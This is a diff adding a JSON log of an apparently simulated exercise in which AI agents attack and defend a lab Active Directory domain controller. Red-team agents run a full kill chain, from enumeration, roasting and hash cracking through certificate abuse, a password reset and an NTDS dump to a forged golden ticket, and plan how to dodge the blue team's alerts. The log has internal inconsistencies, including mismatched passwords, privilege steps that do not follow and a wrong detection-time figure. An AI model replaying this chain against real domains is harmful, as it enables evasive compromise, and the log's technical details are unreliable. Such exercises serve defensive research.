@@ -1,0 +1,359 @@
+[
+  {
+    "timestamp": "2026-08-08T10:00:12Z",
+    "side": "red",
+    "agent": "red_orchestrator",
+    "type": "thinking",
+    "text": "首轮侦察：目标 172.29.0.30 为 AD 域控。先扫端口识别服务，再 sweep SMB/枚举用户。分配 RECON worker。"
+  },
+  {
+    "timestamp": "2026-08-08T10:00:30Z",
+    "side": "red",
+    "agent": "recon_worker",
+    "type": "tool_call",
+    "tool": "nmap_scan",
+    "args": {
+      "target": "172.29.0.30"
+    },
+    "output": "PORT     STATE SERVICE\n88/tcp   open  kerberos\n135/tcp  open  rpc\n139/tcp  open  netbios\n389/tcp  open  ldap\n445/tcp  open  smb\n5985/tcp open  winrm"
+  },
+  {
+    "timestamp": "2026-08-08T10:03:05Z",
+    "side": "red",
+    "agent": "recon_worker",
+    "type": "tool_call",
+    "tool": "smb_sweep",
+    "args": {
+      "target": "172.29.0.30"
+    },
+    "output": "Domain: CONTOSO\nDC: \\\\DC01\nSMB signing: not required\nShares: netlogon, sysvol, IPC$"
+  },
+  {
+    "timestamp": "2026-08-08T10:05:40Z",
+    "side": "red",
+    "agent": "recon_worker",
+    "type": "tool_call",
+    "tool": "enumerate_users",
+    "args": {
+      "target": "172.29.0.30",
+      "domain": "CONTOSO"
+    },
+    "output": "Users: alice, bob, charlie, dave, svc-sql, svc-backup\nGroups: Domain Admins(alice), Domain Users"
+  },
+  {
+    "timestamp": "2026-08-08T10:08:10Z",
+    "side": "blue",
+    "agent": "triage_agent",
+    "type": "alert",
+    "source": "samba_log",
+    "event_id": 4720,
+    "description": "异常 LDAP 查询: 192.168.58.5 → 172.29.0.30:389 大量用户枚举",
+    "ioc": {
+      "src": "192.168.58.5",
+      "dst": "172.29.0.30:389",
+      "count": 8
+    },
+    "severity": "Medium",
+    "technique_id": "T1087.002",
+    "action": "派单 THREAT_HUNTER 深度调查"
+  },
+  {
+    "timestamp": "2026-08-08T10:12:20Z",
+    "side": "red",
+    "agent": "cred_access_worker",
+    "type": "thinking",
+    "text": "蓝队已告警 LDAP 异常，避免直接爆破。改用低成本手法：翻 LDAP description 字段找硬编码密码。"
+  },
+  {
+    "timestamp": "2026-08-08T10:12:45Z",
+    "side": "red",
+    "agent": "cred_access_worker",
+    "type": "tool_call",
+    "tool": "ldap_search_descriptions",
+    "args": {
+      "target": "172.29.0.30",
+      "domain": "CONTOSO"
+    },
+    "output": "alice: description field password = Spring2024!\nbob: description empty\nsvc-sql: description = SQL svc account"
+  },
+  {
+    "timestamp": "2026-08-08T10:14:10Z",
+    "side": "red",
+    "agent": "cred_access_worker",
+    "type": "tool_call",
+    "tool": "username_as_password",
+    "args": {
+      "target": "172.29.0.30",
+      "user": "alice",
+      "password": "Welcome2024!"
+    },
+    "output": "SMB login SUCCESS as CONTOSO\\alice (sid S-1-5-21-...-1107)"
+  },
+  {
+    "timestamp": "2026-08-08T10:15:30Z",
+    "side": "red",
+    "agent": "cred_access_worker",
+    "type": "tool_call",
+    "tool": "asrep_roast",
+    "args": {
+      "target": "172.29.0.30",
+      "users": [
+        "dave",
+        "svc-backup"
+      ]
+    },
+    "output": "dave: DONT_REQ_PREAUTH set -> AS-REP hash captured\n$krb5asrep$23$dave@CONTOSO.LOCAL:7a1f..."
+  },
+  {
+    "timestamp": "2026-08-08T10:16:20Z",
+    "side": "red",
+    "agent": "cred_access_worker",
+    "type": "tool_call",
+    "tool": "kerberoast",
+    "args": {
+      "target": "172.29.0.30",
+      "spn": "HTTP/svc-sql.contoso.local"
+    },
+    "output": "TGS retrieved for HTTP/svc-sql.contoso.local\n$krb5tgs$23$*svc-sql*CONTOSO.LOCAL*HTTP/svc-sql*..."
+  },
+  {
+    "timestamp": "2026-08-08T10:17:00Z",
+    "side": "red",
+    "agent": "cred_access_worker",
+    "type": "tool_call",
+    "tool": "crack_with_hashcat",
+    "args": {
+      "mode": 18200,
+      "hash": "asrep_dave"
+    },
+    "output": "dave hash cracked: Dave123!\nsvc-sql TGS cracked: Sql@2024"
+  },
+  {
+    "timestamp": "2026-08-08T10:18:25Z",
+    "side": "blue",
+    "agent": "threat_hunter",
+    "type": "alert",
+    "source": "kerberos_traffic",
+    "description": "Kerberoasting: 88端口 TGS-REQ 异常，请求 5 个 SPN",
+    "ioc": {
+      "src": "192.168.58.5",
+      "dst": "172.29.0.30:88",
+      "tgs_count": 5
+    },
+    "severity": "High",
+    "technique_id": "T1558.003",
+    "action": "升级 LATERAL_ANALYST；建议封禁 192.168.58.5"
+  },
+  {
+    "timestamp": "2026-08-08T10:18:40Z",
+    "side": "blue",
+    "agent": "threat_hunter",
+    "type": "alert",
+    "source": "kerberos_traffic",
+    "description": "AS-REP roasting: AS-REQ 无预认证",
+    "ioc": {
+      "src": "192.168.58.5",
+      "dst": "172.29.0.30:88",
+      "asrep_count": 2
+    },
+    "severity": "High",
+    "technique_id": "T1558.004",
+    "action": "记录 IoC，关联 Kerberoasting 告警"
+  },
+  {
+    "timestamp": "2026-08-08T10:22:05Z",
+    "side": "red",
+    "agent": "red_orchestrator",
+    "type": "thinking",
+    "text": "蓝队已 High 告警 Kerberos 流量，继续 Kerb 路线风险高。切换 ADCS 证书侧信道——ESC1 漏洞，蓝队覆盖较弱。"
+  },
+  {
+    "timestamp": "2026-08-08T10:22:40Z",
+    "side": "red",
+    "agent": "privesc_worker",
+    "type": "tool_call",
+    "tool": "certipy_find",
+    "args": {
+      "target": "172.29.0.30",
+      "domain": "CONTOSO",
+      "user": "alice"
+    },
+    "output": "ESC1 vuln: template WebServer ENROLLEE_SUPPLIES_SUBJECT=Yes, low-priv enrollee allowed"
+  },
+  {
+    "timestamp": "2026-08-08T10:25:10Z",
+    "side": "red",
+    "agent": "privesc_worker",
+    "type": "tool_call",
+    "tool": "certipy_request",
+    "args": {
+      "target": "172.29.0.30",
+      "template": "WebServer",
+      "san": "bob",
+      "user": "alice"
+    },
+    "output": "Certificate requested with SAN=bob -> PFX obtained (alice auth)"
+  },
+  {
+    "timestamp": "2026-08-08T10:26:30Z",
+    "side": "red",
+    "agent": "privesc_worker",
+    "type": "tool_call",
+    "tool": "certipy_auth",
+    "args": {
+      "pfx": "alice.pfx",
+      "dc": "172.29.0.30"
+    },
+    "output": "PKINIT auth as bob via cert -> got bob TGT / PFX persisted"
+  },
+  {
+    "timestamp": "2026-08-08T10:28:00Z",
+    "side": "red",
+    "agent": "acl_worker",
+    "type": "tool_call",
+    "tool": "ldap_acl_enumeration",
+    "args": {
+      "target": "172.29.0.30",
+      "principal": "alice"
+    },
+    "output": "Domain Users -> alice: GenericAll (over-permissive ACL)"
+  },
+  {
+    "timestamp": "2026-08-08T10:28:50Z",
+    "side": "red",
+    "agent": "acl_worker",
+    "type": "tool_call",
+    "tool": "bloodyad_set_password",
+    "args": {
+      "target": "172.29.0.30",
+      "user": "bob",
+      "new_password": "Pwned@2026!"
+    },
+    "output": "bob password reset OK (4724 event on DC)"
+  },
+  {
+    "timestamp": "2026-08-08T10:30:15Z",
+    "side": "blue",
+    "agent": "lateral_analyst",
+    "type": "alert",
+    "source": "winrm_traffic",
+    "description": "WinRM 连接 192.168.58.5 → 172.29.0.30:5985，whoami /priv 执行",
+    "ioc": {
+      "src": "192.168.58.5",
+      "dst": "172.29.0.30:5985",
+      "user": "bob"
+    },
+    "severity": "Critical",
+    "technique_id": "T1021.006",
+    "action": "升级 ESCALATION_TRIAGE；判定横向移动"
+  },
+  {
+    "timestamp": "2026-08-08T10:32:00Z",
+    "side": "red",
+    "agent": "lateral_worker",
+    "type": "tool_call",
+    "tool": "evil_winrm",
+    "args": {
+      "target": "172.29.0.30",
+      "user": "bob",
+      "password": "Pwned@2026!"
+    },
+    "output": "WinRM shell on DC01 as CONTOSO\\bob -> whoami: contoso\\bob (SeImpersonate)"
+  },
+  {
+    "timestamp": "2026-08-08T10:35:20Z",
+    "side": "red",
+    "agent": "lateral_worker",
+    "type": "tool_call",
+    "tool": "secretsdump",
+    "args": {
+      "target": "172.29.0.30",
+      "source": "ntds"
+    },
+    "output": "NTDS.DIT dumped\nkrbtgt:500:aad3b435b51404eeaad3b435b51404eea:...:::\nAdministrator:..."
+  },
+  {
+    "timestamp": "2026-08-08T10:38:00Z",
+    "side": "blue",
+    "agent": "escalation_triage",
+    "type": "alert",
+    "source": "correlation",
+    "description": "Kerberoasting + ADCS + 横向 + NTDS = 域控失陷",
+    "ioc": {
+      "src": "192.168.58.5",
+      "compromised": [
+        "bob",
+        "krbtgt"
+      ],
+      "dc": "172.29.0.30"
+    },
+    "severity": "Critical",
+    "technique_id": "T1003.006",
+    "action": "确认 Domain Controller Compromise；触发 Orchestrator 应急响应"
+  },
+  {
+    "timestamp": "2026-08-08T10:40:10Z",
+    "side": "red",
+    "agent": "privesc_worker",
+    "type": "tool_call",
+    "tool": "generate_golden_ticket",
+    "args": {
+      "krbtgt_hash": "aad3...c0de",
+      "user": "Administrator",
+      "domain": "CONTOSO"
+    },
+    "output": "Golden ticket forged -> TGT with PAC(Domain Admins) -> DCSync/DCexec as DA SUCCESS"
+  },
+  {
+    "timestamp": "2026-08-08T10:40:30Z",
+    "side": "red",
+    "agent": "red_orchestrator",
+    "type": "thinking",
+    "text": "抢在蓝队封禁前完成黄金票据。Kill chain 7/7 完成，获得 Domain Admin。"
+  },
+  {
+    "timestamp": "2026-08-08T10:42:00Z",
+    "side": "blue",
+    "agent": "orchestrator",
+    "type": "tool_call",
+    "tool": "block_ip",
+    "args": {
+      "ip": "192.168.58.5"
+    },
+    "output": "iptables -A INPUT -s 192.168.58.5 -j DROP -> 192.168.58.5 封禁完成"
+  },
+  {
+    "timestamp": "2026-08-08T10:43:15Z",
+    "side": "blue",
+    "agent": "orchestrator",
+    "type": "tool_call",
+    "tool": "harden_service",
+    "args": {
+      "service": "SMB",
+      "policy": "signing_required"
+    },
+    "output": "SMB 签名强制启用；Kerberos 加密类型审计开启"
+  },
+  {
+    "timestamp": "2026-08-08T10:45:00Z",
+    "side": "blue",
+    "agent": "orchestrator",
+    "type": "tool_call",
+    "tool": "remediate",
+    "args": {
+      "actions": [
+        "disable_dave_preauth",
+        "revoke_webserver_cert",
+        "reset_krbtgt"
+      ]
+    },
+    "output": "dave 预认证禁用；WebServer 模板吊销；krbtgt 重置 *2 完成"
+  },
+  {
+    "timestamp": "2026-08-08T10:45:20Z",
+    "side": "blue",
+    "agent": "orchestrator",
+    "type": "thinking",
+    "text": "响应完成。MTTD=15min(10:08告警->10:38确认失陷)，封禁在 10:42。漏检阶段2初始访问，扣分。"
+  }
+]
